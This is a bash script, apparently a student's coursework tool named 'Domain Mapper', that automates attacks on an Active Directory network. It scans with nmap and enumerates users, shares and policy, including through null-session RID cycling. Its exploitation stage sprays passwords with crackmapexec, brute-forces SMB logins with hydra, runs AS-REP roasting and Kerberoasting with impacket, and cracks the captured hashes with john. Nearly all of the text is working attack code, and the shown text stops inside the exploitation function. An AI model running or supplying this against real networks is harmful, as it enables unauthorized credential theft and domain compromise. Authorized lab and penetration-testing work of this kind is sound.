#!/bin/bash
# ============================================================
# Student Name: WUBET ABIE
# Unit: TMagen773640
# Student Code: S12
# Program: ZX305
# Lecturer Name: Eliran Berkovich
# Project: DOMAIN MAPPER - Active Directory Assessment Tool
# ============================================================

# ------------------------------------------------------------
# PHASE 0 - Skeleton: colors, banners, root check, deps, main stub
# ------------------------------------------------------------

# ---------- Color variables ----------
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# ---------- Globals ----------
NETWORK=""
DOMAIN=""
AD_USER=""
AD_PASS=""
PASSWORD_FILE=""
OUTPUT_DIR=""
LOG_FILE=""
START_TIME=""
LVL_SCAN=""
LVL_ENUM=""
LVL_EXPL=""
DC_IP=""
DHCP_IP=""
CME_BIN=""   # holds "crackmapexec" or "nxc", whichever exists
PDF_BIN=""   # holds the pdf converter found (wkhtmltopdf / pandoc / enscript)
WIZARD=0     # set by -w/--wizard

# ---------- print_header: stage separator ----------
print_header() {
    echo -e "\n${CYAN}============================================================${NC}"
    echo -e "${CYAN}  $1${NC}"
    echo -e "${CYAN}============================================================${NC}"
}

# ---------- show_banner ----------
show_banner() {
    echo -e "${GREEN}"
    echo "   ____   ___  __  __    _    ___ _   _   __  __    _    ____  ____  _____ ____  "
    echo "  |  _ \ / _ \|  \/  |  / \  |_ _| \ | | |  \/  |  / \  |  _ \|  _ \| ____|  _ \ "
    echo "  | | | | | | | |\/| | / _ \  | ||  \| | | |\/| | / _ \ | |_) | |_) |  _| | |_) |"
    echo "  | |_| | |_| | |  | |/ ___ \ | || |\  | | |  | |/ ___ \|  __/|  __/| |___|  _ < "
    echo "  |____/ \___/|_|  |_/_/   \_\___|_| \_| |_|  |_/_/   \_\_|   |_|   |_____|_| \_\\"
    echo -e "${NC}"
    echo -e "${YELLOW}        PROJECT: DOMAIN MAPPER | ZX305 - AD Assessment Tool${NC}"
    echo -e "${YELLOW}        Student: WUBET ABIE | Unit: TMagen773640${NC}\n"
}

# ---------- check_root: some scans/enum need root ----------
check_root() {
    if [[ $EUID -ne 0 ]]; then
        echo -e "${RED}[!] This tool must be run as root (SYN/UDP scans, enum).${NC}"
        echo -e "${YELLOW} -> Try: sudo $0${NC}"
        exit 1
    fi
    echo -e "${GREEN}[+] Running as root.${NC}"
}

# ---------- apt_install: try to install a package, refresh index once if needed ----------
APT_UPDATED=0
apt_install() {
    local pkg="$1"
    echo -e "${YELLOW} -> Installing $pkg ...${NC}"
    if [[ $APT_UPDATED -eq 0 ]]; then
        apt-get update -y >/dev/null 2>&1
        APT_UPDATED=1
    fi
    DEBIAN_FRONTEND=noninteractive apt-get install -y "$pkg" >/dev/null 2>&1
}

# ---------- ensure_tool: install package if the command is missing, verify after ----------
# usage: ensure_tool <command> <apt-package>
ensure_tool() {
    local cmd="$1" pkg="$2"
    if command -v "$cmd" >/dev/null 2>&1; then
        echo -e "${GREEN}[+] Found: $cmd${NC}"
        return 0
    fi
    echo -e "${YELLOW}[!] Missing: $cmd${NC}"
    apt_install "$pkg"
    if command -v "$cmd" >/dev/null 2>&1; then
        echo -e "${GREEN}[+] Installed: $cmd${NC}"
        return 0
    fi
    echo -e "${RED}[!] Could not install $cmd (pkg: $pkg). Install manually.${NC}"
    return 1
}

# ---------- check_deps: verify required tools, auto-install missing ones ----------
check_deps() {
    print_header "0. Dependency Check"
    local missing=0

    # simple tools: command -> apt package (name differs only where noted)
    ensure_tool nmap nmap                 || missing=1
    ensure_tool hydra hydra               || missing=1
    ensure_tool enum4linux enum4linux     || missing=1
    ensure_tool rpcclient smbclient       || missing=1   # rpcclient ships in smbclient
    ensure_tool sipcalc sipcalc           || missing=1
    ensure_tool john john                 || missing=1

    # CrackMapExec is shipped as nxc/netexec on current Kali - detect either, else install
    if command -v crackmapexec >/dev/null 2>&1; then
        CME_BIN="crackmapexec"
        echo -e "${GREEN}[+] Found: crackmapexec (CME_BIN=$CME_BIN)${NC}"
    elif command -v nxc >/dev/null 2>&1; then
        CME_BIN="nxc"
        echo -e "${GREEN}[+] Found: nxc/netexec (CME_BIN=$CME_BIN)${NC}"
    else
        echo -e "${YELLOW}[!] Missing: crackmapexec/nxc${NC}"
        apt_install netexec
        if command -v nxc >/dev/null 2>&1; then CME_BIN="nxc"
        elif command -v crackmapexec >/dev/null 2>&1; then CME_BIN="crackmapexec"; fi
        if [[ -n "$CME_BIN" ]]; then echo -e "${GREEN}[+] Installed: $CME_BIN${NC}"
        else echo -e "${RED}[!] Could not install netexec.${NC}"; missing=1; fi
    fi

    # impacket scripts are prefixed impacket- on Kali
    ensure_tool impacket-GetNPUsers impacket-scripts || missing=1

    # PDF converter: prefer wkhtmltopdf, install it if none present
    if command -v wkhtmltopdf >/dev/null 2>&1; then
        PDF_BIN="wkhtmltopdf"
        echo -e "${GREEN}[+] Found: wkhtmltopdf (PDF_BIN=$PDF_BIN)${NC}"
    elif command -v pandoc >/dev/null 2>&1; then
        PDF_BIN="pandoc"
        echo -e "${GREEN}[+] Found: pandoc (PDF_BIN=$PDF_BIN)${NC}"
    elif command -v enscript >/dev/null 2>&1; then
        PDF_BIN="enscript"
        echo -e "${GREEN}[+] Found: enscript (PDF_BIN=$PDF_BIN)${NC}"
    else
        echo -e "${YELLOW}[!] Missing PDF tool - trying candidates...${NC}"
        # wkhtmltopdf was dropped from current Kali repos, so try a chain:
        # 1) wkhtmltopdf  2) enscript+ghostscript (light, reliable)  3) pandoc
        apt_install wkhtmltopdf
        if command -v wkhtmltopdf >/dev/null 2>&1; then
            PDF_BIN="wkhtmltopdf"; echo -e "${GREEN}[+] Installed: wkhtmltopdf${NC}"
        else
            # enscript needs ps2pdf, which ships in ghostscript
            apt_install enscript
            apt_install ghostscript
            if command -v enscript >/dev/null 2>&1 && command -v ps2pdf >/dev/null 2>&1; then
                PDF_BIN="enscript"; echo -e "${GREEN}[+] Installed: enscript+ghostscript${NC}"
            else
                apt_install pandoc
                if command -v pandoc >/dev/null 2>&1; then
                    PDF_BIN="pandoc"; echo -e "${GREEN}[+] Installed: pandoc${NC}"
                else
                    echo -e "${RED}[!] Could not install any PDF tool.${NC}"; missing=1
                fi
            fi
        fi
    fi

    if [[ $missing -ne 0 ]]; then
        echo -e "\n${RED}[!] Some tools could not be installed automatically - see above.${NC}"
        exit 1
    fi
    echo -e "${GREEN}[+] All dependencies satisfied.${NC}"
}

# ---------- cleanup + SIGINT handling ----------
cleanup() {
    # remove temp files here as the project grows
    :
}

handle_sigint() {
    echo -e "\n${RED}[!] Interrupted by user. Cleaning up...${NC}"
    cleanup
    exit 130
}
trap handle_sigint SIGINT

# ---------- show_completion_message ----------
show_completion_message() {
    echo -e "\n${GREEN}============================================================${NC}"
    echo -e "${GREEN}[+] DOMAIN MAPPER finished.${NC}"
    echo -e "${GREEN}    Output directory: ${OUTPUT_DIR:-<not set>}${NC}"
    echo -e "${GREEN}============================================================${NC}"
}

# ============================================================
# PHASE 1 - Input stage (Requirement 1) + level helpers
# ============================================================

# ---------- level_rank / level_at_least: "higher includes lower" logic ----------
# tiers: none=0 basic=1 intermediate=2 advanced=3
level_rank() {
    case "$1" in
        none) echo 0 ;;
        basic) echo 1 ;;
        intermediate) echo 2 ;;
        advanced) echo 3 ;;
        *) echo 0 ;;
    esac
}
# usage: if level_at_least "$LVL_SCAN" intermediate; then ... fi
level_at_least() {
    local have need
    have=$(level_rank "$1")
    need=$(level_rank "$2")
    (( have >= need ))
}

# ---------- validate_network: accept an IP or CIDR (reused from VULNER) ----------
validate_network() {
    local net="$1"
    # shape: 4 octets, optional /0-32
    if [[ ! "$net" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}(/[0-9]{1,2})?$ ]]; then
        return 1
    fi
    # each octet 0-255
    local ip="${net%%/*}"
    local IFS='.'
    local -a oct=($ip)
    local o
    for o in "${oct[@]}"; do
        (( o >= 0 && o <= 255 )) || return 1
    done
    # if a CIDR mask is present, it must be 0-32
    if [[ "$net" == */* ]]; then
        local mask="${net##*/}"
        (( mask >= 0 && mask <= 32 )) || return 1
    fi
    return 0
}

# ---------- ask_level: prompt one mode for its operation level ----------
ask_level() {
    local mode="$1" choice
    # NOTE: this function's stdout is captured via $(...), so all prompts/menus
    # must go to stderr (>&2). Only the final chosen level is echoed to stdout.
    while true; do
        echo -e "${CYAN} -> Level for ${mode}:${NC}" >&2
        echo -e "    ${YELLOW}0)${NC} none          ${YELLOW}1)${NC} basic" >&2
        echo -e "    ${YELLOW}2)${NC} intermediate  ${YELLOW}3)${NC} advanced" >&2
        read -rp ">> Enter number [0-3]: " choice >&2
        case "$choice" in
            0) echo "none" ;         return 0 ;;
            1) echo "basic" ;        return 0 ;;
            2) echo "intermediate" ; return 0 ;;
            3) echo "advanced" ;     return 0 ;;
            *) echo -e "${RED}[!] Invalid choice. Enter 0, 1, 2 or 3.${NC}" >&2 ;;
        esac
    done
}

# ---------- get_user_input: collect + validate everything (Req 1.1-1.4) ----------
get_user_input() {
    print_header "1. User Input"

    # 1.1 target network range
    while true; do
        read -rp ">> Target network range (single IP or CIDR, e.g. <IP> or <IP>/24): " NETWORK
        if validate_network "$NETWORK"; then
            echo -e "${GREEN}[+] Network accepted: $NETWORK${NC}"
            break
        fi
        echo -e "${RED}[!] Invalid network/CIDR. Try again.${NC}"
    done

    # 1.2a domain name (basic name.tld shape)
    while true; do
        read -rp ">> Domain name (e.g. <domain>.local): " DOMAIN
        if [[ "$DOMAIN" =~ ^[A-Za-z0-9.-]+\.[A-Za-z]+$ ]]; then
            echo -e "${GREEN}[+] Domain accepted: $DOMAIN${NC}"
            break
        fi
        echo -e "${RED}[!] Invalid domain. Expected something like name.tld.${NC}"
    done

    # 1.2b/c AD credentials (may be empty -> disables "Advanced (AD only)" steps)
    read -rp ">> AD username (leave empty to skip AD-only Advanced steps): " AD_USER
    if [[ -n "$AD_USER" ]]; then
        read -rsp ">> AD password: " AD_PASS
        echo
        echo -e "${GREEN}[+] AD credentials set for user: $AD_USER${NC}"
    else
        echo -e "${YELLOW}[!] No AD user given - Advanced AD enum/exploit steps will be skipped.${NC}"
    fi

    # 1.3 password list, default rockyou (gunzip .gz if needed)
    local default_rockyou="/usr/share/wordlists/rockyou.txt"
    read -rp ">> Password list [Enter for rockyou]: " PASSWORD_FILE
    if [[ -z "$PASSWORD_FILE" ]]; then
        if [[ ! -f "$default_rockyou" && -f "${default_rockyou}.gz" ]]; then
            echo -e "${YELLOW} -> Extracting rockyou.txt.gz ...${NC}"
            gunzip -k "${default_rockyou}.gz"
        fi
        PASSWORD_FILE="$default_rockyou"
    fi
    if [[ -f "$PASSWORD_FILE" ]]; then
        echo -e "${GREEN}[+] Password list: $PASSWORD_FILE${NC}"
    else
        echo -e "${YELLOW}[!] Password list not found: $PASSWORD_FILE (spraying/cracking may fail).${NC}"
    fi

    # 1.2d output directory name
    while true; do
        read -rp ">> Output directory name: " OUTPUT_DIR
        if [[ "$OUTPUT_DIR" =~ ^[a-zA-Z0-9_-]+$ ]]; then
            mkdir -p "$OUTPUT_DIR"
            LOG_FILE="$OUTPUT_DIR/run.log"
            echo -e "${GREEN}[+] Output directory: $OUTPUT_DIR${NC}"
            break
        fi
        echo -e "${RED}[!] Use only letters, numbers, _ or -.${NC}"
    done

    # 1.4 per-mode operation levels
    echo -e "\n${CYAN}Select an operation level for each mode (higher includes lower):${NC}"
    LVL_SCAN=$(ask_level "SCANNING")
    LVL_ENUM=$(ask_level "ENUMERATION")
    LVL_EXPL=$(ask_level "EXPLOITATION")

    # settings summary
    print_header "Settings Summary"
    echo -e "${GREEN} Network      :${NC} $NETWORK"
    echo -e "${GREEN} Domain       :${NC} $DOMAIN"
    echo -e "${GREEN} AD user      :${NC} ${AD_USER:-<none>}"
    echo -e "${GREEN} Password list:${NC} $PASSWORD_FILE"
    echo -e "${GREEN} Output dir   :${NC} $OUTPUT_DIR"
    echo -e "${GREEN} Scan level   :${NC} $LVL_SCAN"
    echo -e "${GREEN} Enum level   :${NC} $LVL_ENUM"
    echo -e "${GREEN} Exploit level:${NC} $LVL_EXPL"
}

# ============================================================
# PHASE 2 - Scanning mode (Requirement 2) + gnmap parsers
# ============================================================

# ---------- get_live_hosts: list IPs marked Up in the .gnmap (reused from VULNER) ----------
get_live_hosts() {
    local gnmap="$OUTPUT_DIR/scan.gnmap"
    [[ -f "$gnmap" ]] || return 1
    grep "Status: Up" "$gnmap" | awk '{print $2}'
}

# ---------- port_open: true if given host has given port open in the .gnmap ----------
# usage: if port_open 192.168.73.10 445; then ...
port_open() {
    local host="$1" port="$2"
    local gnmap="$OUTPUT_DIR/scan.gnmap"
    [[ -f "$gnmap" ]] || return 1
    grep "Host: $host " "$gnmap" | grep -qE "(^|[ ,])${port}/open"
}

# ---------- network_info: subnet breakdown (network/broadcast/host count) via sipcalc ----------
network_info() {
    command -v sipcalc >/dev/null 2>&1 || return 0
    local out="$OUTPUT_DIR/network_info.txt"
    echo -e "${CYAN} -> Subnet details (sipcalc)${NC}"
    sipcalc "$NETWORK" | tee "$out" | tee -a "$LOG_FILE"
    echo -e "${GREEN}[+] Subnet info saved: $out${NC}"
}

# ---------- scanning_mode: graduated nmap (-Pn -> -p- -> -sU) ----------
scanning_mode() {
    [[ "$LVL_SCAN" == none ]] && { echo -e "${YELLOW}[!] Scanning mode: none - skipped.${NC}"; return; }
    print_header "2. Scanning Mode (level: $LVL_SCAN)"

    # Resolve the target subnet (network/broadcast/usable hosts) before scanning.
    network_info

    # Build the nmap flag string incrementally so higher levels include lower ones.
    # -sS TCP SYN scan + -sV versions. -T4 speeds things up. No --host-timeout:
    # a full -p- (+UDP) sweep on one host legitimately needs minutes and a short
    # timeout was cutting the scan off before any ports were recorded.
    local flags="-sS -sV -T4"
    local port_spec=""         # empty = nmap default top ports

    # 2.1 Basic: -Pn (assume all hosts up, skip host discovery)
    if level_at_least "$LVL_SCAN" basic; then
        flags="-Pn $flags"
        echo -e "${GREEN}[+] Basic: -Pn (skip host discovery)${NC}"
    fi

    # 2.2 Intermediate: all 65535 TCP ports
    if level_at_least "$LVL_SCAN" intermediate; then
        port_spec="-p-"
        echo -e "${GREEN}[+] Intermediate: -p- (all 65535 TCP ports)${NC}"
    fi

    # 2.3 Advanced: add UDP. -sU on -p- is far too slow for a lab, so scan common UDP ports.
    # -sS is already in $flags so nmap has a TCP scan type when a T:/U: list is given.
    if level_at_least "$LVL_SCAN" advanced; then
        flags="$flags -sU"
        # keep TCP full range and pair with a short UDP list on the same run
        if [[ -n "$port_spec" ]]; then
            port_spec="-p T:1-65535,U:53,67,88,123,137,161,500,4500"
        else
            port_spec="-p U:53,67,88,123,137,161,500,4500"
        fi
        echo -e "${GREEN}[+] Advanced: added -sU on common UDP ports (lab tradeoff for speed)${NC}"
    fi

    # Run nmap once with 3-format output so later stages can parse it.
    echo -e "${CYAN} -> Running: nmap $flags $port_spec $NETWORK${NC}"
    nmap $flags $port_spec "$NETWORK" -oA "$OUTPUT_DIR/scan" | tee -a "$LOG_FILE"

    # Quick summary of what we found.
    local hosts
    hosts=$(get_live_hosts)
    if [[ -n "$hosts" ]]; then
        echo -e "${GREEN}[+] Live hosts:${NC}"
        echo "$hosts" | sed 's/^/    /'
    else
        echo -e "${YELLOW}[!] No live hosts parsed from scan.gnmap.${NC}"
    fi
    echo -e "${GREEN}[+] Scan output saved: $OUTPUT_DIR/scan.{nmap,gnmap,xml}${NC}"
}

# ============================================================
# PHASE 3 - Enumeration mode (Requirement 3)
# ============================================================

# ---------- enum_basic: services (-sV), DC IP, DHCP IP ----------
enum_basic() {
    echo -e "${CYAN} -> Enumeration BASIC${NC}"
    local out="$OUTPUT_DIR/enum_basic.txt"

    # 3.1.1 services on open ports already come from scan.gnmap (-sV in Phase 2)
    echo "== Live hosts + open ports ==" > "$out"
    local hosts h
    hosts=$(get_live_hosts)
    for h in $hosts; do
        echo "[$h]" >> "$out"
        grep "Host: $h " "$OUTPUT_DIR/scan.gnmap" | grep -oE '[0-9]+/open/[^ ,]*' >> "$out"
    done

    # 3.1.2 DC IP = host with Kerberos(88)+LDAP(389)+SMB(445) open together
    for h in $hosts; do
        if port_open "$h" 88 && port_open "$h" 389 && port_open "$h" 445; then
            DC_IP="$h"
            break
        fi
    done
    if [[ -n "$DC_IP" ]]; then
        echo -e "${GREEN}[+] DC identified: $DC_IP (Kerberos+LDAP+SMB)${NC}"
        echo "DC_IP: $DC_IP" >> "$out"
    else
        # Fallback: the SMB host advertising our domain is the DC. This also
        # covers the case where the port scan didn't record ports for a host.
        echo -e "${YELLOW}[!] DC not identified from ports - trying $CME_BIN smb...${NC}"
        local cme_out
        cme_out=$($CME_BIN smb "$NETWORK" 2>/dev/null | tee -a "$out")
        # prefer the line whose (domain:...) matches the supplied domain
        DC_IP=$(echo "$cme_out" | grep -iF "domain:$DOMAIN" \
                | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' | head -1)
        # else fall back to the first SMB host that answered
        [[ -z "$DC_IP" ]] && DC_IP=$(echo "$cme_out" \
                | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' | head -1)
        if [[ -n "$DC_IP" ]]; then
            echo -e "${GREEN}[+] DC identified via SMB: $DC_IP (domain $DOMAIN)${NC}"
            echo "DC_IP: $DC_IP" >> "$out"
        fi
    fi

    # 3.1.3 DHCP IP (best-effort broadcast discovery)
    echo -e "${CYAN} -> Discovering DHCP (best-effort)...${NC}"
    local dhcp_out
    dhcp_out=$(nmap --script broadcast-dhcp-discover 2>/dev/null | tee -a "$out")
    DHCP_IP=$(echo "$dhcp_out" | grep -i "Server Identifier" | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' | head -1)
    if [[ -n "$DHCP_IP" ]]; then
        echo -e "${GREEN}[+] DHCP server: $DHCP_IP${NC}"
        echo "DHCP_IP: $DHCP_IP" >> "$out"
    else
        echo -e "${YELLOW}[!] DHCP not discovered (often the DC in a small lab).${NC}"
    fi
    echo -e "${GREEN}[+] Basic enum saved: $out${NC}"
}

# ---------- enum_intermediate: per-service IPs, shares, 3 NSE scripts ----------
enum_intermediate() {
    echo -e "${CYAN} -> Enumeration INTERMEDIATE${NC}"
    local out="$OUTPUT_DIR/enum_intermediate.txt"
    : > "$out"

    # 3.2.1 bucket hosts by service
    declare -A svc=( [21]=FTP [22]=SSH [445]=SMB [5985]=WinRM [389]=LDAP [3389]=RDP )
    local hosts h p
    hosts=$(get_live_hosts)
    echo "== Per-service hosts ==" >> "$out"
    for p in "${!svc[@]}"; do
        local line="${svc[$p]} ($p):"
        for h in $hosts; do
            port_open "$h" "$p" && line+=" $h"
        done
        echo "$line" >> "$out"
        echo -e "${GREEN}[+] $line${NC}"
    done

    # 3.2.2 shared folders on SMB hosts
    echo "== SMB shares ==" >> "$out"
    for h in $hosts; do
        if port_open "$h" 445; then
            echo "[$h shares]" >> "$out"
            $CME_BIN smb "$h" --shares 2>/dev/null >> "$out"
        fi
    done

    # 3.2.3 three justified NSE scripts against the DC (fall back to network if no DC)
    local target="${DC_IP:-$NETWORK}"
    echo -e "${CYAN} -> Running 3 NSE scripts against $target${NC}"
    nmap -Pn -p 445,389,88 --script smb-os-discovery,smb-enum-shares,ldap-rootdse \
        "$target" -oN "$OUTPUT_DIR/enum_nse.txt" | tee -a "$out"

    # 3.2.4 enum4linux: full SMB/RPC enumeration (users, groups, shares, OS, policy).
    # Runs unauthenticated by default; uses AD creds automatically when supplied.
    if command -v enum4linux >/dev/null 2>&1; then
        echo -e "${CYAN} -> enum4linux against $target${NC}"
        local e4l=(-a)
        [[ -n "$AD_USER" ]] && e4l=(-a -u "$AD_USER" -p "$AD_PASS")
        enum4linux "${e4l[@]}" "$target" 2>/dev/null \
            | tee "$OUTPUT_DIR/enum4linux.txt" >> "$out"
        echo -e "${GREEN}[+] enum4linux saved: $OUTPUT_DIR/enum4linux.txt${NC}"
    fi
    echo -e "${GREEN}[+] Intermediate enum saved: $out + enum_nse.txt${NC}"
}

# ---------- enum_advanced: AD-creds gated (users/groups/shares/policy/etc) ----------
enum_advanced() {
    if [[ -z "$AD_USER" ]]; then
        echo -e "${YELLOW}[!] Advanced enum skipped - no AD credentials supplied.${NC}"
        return
    fi
    if [[ -z "$DC_IP" ]]; then
        echo -e "${YELLOW}[!] Advanced enum skipped - DC IP not identified.${NC}"
        return
    fi
    echo -e "${CYAN} -> Enumeration ADVANCED (AD)${NC}"
    local out="$OUTPUT_DIR/enum_advanced.txt"
    local creds=(-u "$AD_USER" -p "$AD_PASS")

    echo "== All users ==" | tee "$out"
    $CME_BIN smb "$DC_IP" "${creds[@]}" --users 2>/dev/null | tee -a "$out"

    echo "== All groups ==" | tee -a "$out"
    $CME_BIN smb "$DC_IP" "${creds[@]}" --groups 2>/dev/null | tee -a "$out"

    echo "== All shares ==" | tee -a "$out"
    $CME_BIN smb "$DC_IP" "${creds[@]}" --shares 2>/dev/null | tee -a "$out"

    echo "== Password policy ==" | tee -a "$out"
    $CME_BIN smb "$DC_IP" "${creds[@]}" --pass-pol 2>/dev/null | tee -a "$out"

    # base DN from the domain, e.g. netsec.local -> dc=netsec,dc=local
    local base_dn="dc=$(echo "$DOMAIN" | sed 's/\./,dc=/g')"

    # ldap_uac: list sAMAccountNames matching a userAccountControl bit filter.
    # Prefer ldapsearch (reliable authenticated bind); fall back to CME ldap.
    ldap_uac() {
        local filter="$1"
        if command -v ldapsearch >/dev/null 2>&1; then
            ldapsearch -x -LLL -H "ldap://$DC_IP" -D "$AD_USER@$DOMAIN" -w "$AD_PASS" \
                -b "$base_dn" "$filter" sAMAccountName 2>/dev/null \
                | awk -F': ' '/^sAMAccountName:/{print $2}'
        else
            $CME_BIN ldap "$DC_IP" "${creds[@]}" --query "$filter" "sAMAccountName" 2>/dev/null
        fi
    }

    # disabled accounts (userAccountControl bit 2)
    echo "== Disabled accounts ==" | tee -a "$out"
    ldap_uac "(userAccountControl:1.2.840.113556.1.4.803:=2)" | tee -a "$out"

    # never-expire accounts (userAccountControl bit 65536)
    echo "== Never-expire accounts ==" | tee -a "$out"
    ldap_uac "(userAccountControl:1.2.840.113556.1.4.803:=65536)" | tee -a "$out"

    # Domain Admins members
    echo "== Domain Admins members ==" | tee -a "$out"
    net rpc group members "Domain Admins" -U "$AD_USER%$AD_PASS" -S "$DC_IP" 2>/dev/null | tee -a "$out"

    echo -e "${GREEN}[+] Advanced enum saved: $out${NC}"
}

# ---------- enumeration_mode: layer basic -> intermediate -> advanced ----------
enumeration_mode() {
    [[ "$LVL_ENUM" == none ]] && { echo -e "${YELLOW}[!] Enumeration mode: none - skipped.${NC}"; return; }
    print_header "3. Enumeration Mode (level: $LVL_ENUM)"
    level_at_least "$LVL_ENUM" basic        && enum_basic
    level_at_least "$LVL_ENUM" intermediate && enum_intermediate
    level_at_least "$LVL_ENUM" advanced     && enum_advanced
}

# ============================================================
# PHASE 4 - Exploitation mode (Requirement 4)
# ============================================================

# ---------- write a users.txt from enum output (needed for spraying/kerberos) ----------
build_users_file() {
    local uf="$OUTPUT_DIR/users.txt"
    # Prefer CME --users output captured during Advanced enum; else query the DC now.
    if [[ -f "$OUTPUT_DIR/enum_advanced.txt" ]]; then
        # CME prints "DOMAIN\username" columns - pull the sam account names
        grep -oE '[A-Za-z0-9._-]+\\[A-Za-z0-9._$-]+' "$OUTPUT_DIR/enum_advanced.txt" \
            | awk -F'\\' '{print $2}' | sort -u > "$uf"
    fi
    # With AD creds: authenticated rpcclient user enumeration.
    if [[ ! -s "$uf" && -n "$AD_USER" && -n "$DC_IP" ]]; then
        rpcclient -U "$AD_USER%$AD_PASS" "$DC_IP" -c enumdomusers 2>/dev/null \
            | grep -oE 'user:\[[^]]+\]' | sed 's/user:\[//;s/\]//' | sort -u > "$uf"
    fi
    # No creds: try anonymous discovery so spraying/AS-REP still have targets.
    # (a) CME RID cycling over a null session
    if [[ ! -s "$uf" && -n "$DC_IP" ]]; then
        $CME_BIN smb "$DC_IP" -u '' -p '' --rid-brute 2>/dev/null \
            | grep -i 'SidTypeUser' | grep -oE '\\[^ ]+' | tr -d '\\' | sort -u > "$uf"
    fi
    # (b) rpcclient null session
    if [[ ! -s "$uf" && -n "$DC_IP" ]]; then
        rpcclient -U "%" "$DC_IP" -c enumdomusers 2>/dev/null \
            | grep -oE 'user:\[[^]]+\]' | sed 's/user:\[//;s/\]//' | sort -u > "$uf"
    fi
    [[ -s "$uf" ]] && echo "$uf"
}

# ---------- expl_basic: NSE vulnerability scan ----------
expl_basic() {
    echo -e "${CYAN} -> Exploitation BASIC (NSE vuln scan)${NC}"
    local out="$OUTPUT_DIR/exploit_vuln.txt"
    nmap -Pn --script vuln "$NETWORK" -oN "$out" | tee -a "$LOG_FILE"
    echo -e "${GREEN}[+] Vuln scan saved: $out${NC}"
}

# ---------- expl_intermediate: domain-wide password spraying ----------
expl_intermediate() {
    echo -e "${CYAN} -> Exploitation INTERMEDIATE (password spraying)${NC}"
    local out="$OUTPUT_DIR/exploit_spray.txt"
    local uf
    uf=$(build_users_file)
    if [[ -z "$uf" ]]; then
        echo -e "${YELLOW}[!] Spraying skipped - no users list (need AD creds/DC).${NC}"
        return
    fi
    echo -e "${GREEN}[+] Using users list: $uf ($(wc -l < "$uf") users)${NC}"
    # Spray one password at a time across all users (safe for lockout policy).
    # credit: standard CME spraying pattern - https://www.crackmapexec.wiki/
    local pw
    # `|| [[ -n "$pw" ]]` so a final line without a trailing newline is not dropped.
    while IFS= read -r pw || [[ -n "$pw" ]]; do
        [[ -z "$pw" ]] && continue
        $CME_BIN smb "${DC_IP:-$NETWORK}" -u "$uf" -p "$pw" \
            --continue-on-success 2>/dev/null | grep -E '\[\+\]' | tee -a "$out"
    done < <(head -n 20 "$PASSWORD_FILE")   # lab: top-20 of rockyou to keep it fast

    # hydra: brute-force SMB logins (every user x every password in the FULL list).
    # Complements CME spraying and reads the whole password file, not just the top 20.
    if command -v hydra >/dev/null 2>&1 && [[ -f "$PASSWORD_FILE" ]]; then
        local htarget="$DC_IP"
        if [[ -z "$htarget" ]]; then
            local h
            for h in $(get_live_hosts 2>/dev/null); do
                port_open "$h" 445 && { htarget="$h"; break; }
            done
        fi
        if [[ -n "$htarget" ]]; then
            echo -e "${CYAN} -> hydra SMB brute-force against $htarget${NC}"
            hydra -L "$uf" -P "$PASSWORD_FILE" -t 1 -o "$OUTPUT_DIR/hydra_smb.txt" \
                "smb://$htarget" 2>/dev/null | grep -E '\[445\]|login:' | tee -a "$out"
            echo -e "${GREEN}[+] hydra results saved: $OUTPUT_DIR/hydra_smb.txt${NC}"
        else
            echo -e "${YELLOW}[!] hydra skipped - no SMB (445) host resolved.${NC}"
        fi
    fi
    echo -e "${GREEN}[+] Spray results saved: $out${NC}"
}

# ---------- expl_advanced: Kerberos extraction + cracking ----------
expl_advanced() {
    if [[ -z "$DC_IP" ]]; then
        echo -e "${YELLOW}[!] Advanced exploitation skipped - DC IP not identified.${NC}"
        return
    fi
    echo -e "${CYAN} -> Exploitation ADVANCED (Kerberos)${NC}"
    local uf
    uf=$(build_users_file)

    # AS-REP roasting: users without Kerberos pre-auth. Needs only a user list
    # + the DC - NO credentials required - so it runs even for an anonymous user.
    if [[ -n "$uf" ]]; then
        echo -e "${CYAN} -> AS-REP roasting${NC}"
        impacket-GetNPUsers "$DOMAIN"/ -usersfile "$uf" -no-pass -dc-ip "$DC_IP" \
            -outputfile "$OUTPUT_DIR/asrep.hash" 2>/dev/null | tee -a "$LOG_FILE"
    else
        echo -e "${YELLOW}[!] AS-REP roasting skipped - could not build a users list.${NC}"
    fi

    # Kerberoasting: request service tickets - this one DOES need valid creds.
    if [[ -n "$AD_USER" ]]; then
        echo -e "${CYAN} -> Kerberoasting (GetUserSPNs)${NC}"
        impacket-GetUserSPNs "$DOMAIN"/"$AD_USER":"$AD_PASS" -dc-ip "$DC_IP" -request \
            -outputfile "$OUTPUT_DIR/spn.hash" 2>/dev/null | tee -a "$LOG_FILE"
    else
        echo -e "${YELLOW}[!] Kerberoasting skipped - needs AD credentials.${NC}"
    fi

    # Crack whatever hashes we extracted with john + the supplied password list.
    # If the supplied list cracks nothing, fall back to rockyou automatically so
    # the report shows real recovered passwords (AS-REP RC4 cracks very fast).
    local rockyou="/usr/share/wordlists/rockyou.txt"
    local h
    for h in "$OUTPUT_DIR/asrep.hash" "$OUTPUT_DIR/spn.hash"; do
        [[ -s "$h" ]] || continue
        echo -e "${CYAN} -> Cracking $(basename "$h") with john (supplied list)${NC}"
        john --wordlist="$PASSWORD_FILE" "$h" 2>/dev/null | tee -a "$LOG_FILE"
        # nothing cracked yet and rockyou is available and different -> retry
        if ! john --show "$h" 2>/dev/null | grep -qE '^[^[:space:]]+:' \
           && [[ -f "$rockyou" && "$PASSWORD_FILE" != "$rockyou" ]]; then
            echo -e "${YELLOW} -> Supplied list failed; retrying with rockyou...${NC}"
            john --wordlist="$rockyou" "$h" 2>/dev/null | tee -a "$LOG_FILE"
        fi
        # keep only real "user:password" lines; drop john's summary line
        # ("N password hashes cracked, M left") which has no colon.
        john --show "$h" 2>/dev/null \
            | grep -E '^[^[:space:]]+:' | tee -a "$OUTPUT_DIR/cracked.txt"
    done
    echo -e "${GREEN}[+] Kerberos hashes + cracked results saved in $OUTPUT_DIR${NC}"
}

# ---------- exploitation_mode: layer basic -> intermediate -> advanced ----------
exploitation_mode() {
    [[ "$LVL_EXPL" == none ]] && { echo -e "${YELLOW}[!] Exploitation mode: none - skipped.${NC}"; return; }
    print_header "4. Exploitation Mode (level: $LVL_EXPL)"
    level_at_least "$LVL_EXPL" basic        && expl_basic
    level_at_least "$LVL_EXPL" intermediate && expl_intermediate
    level_at_least "$LVL_EXPL" advanced     && expl_advanced
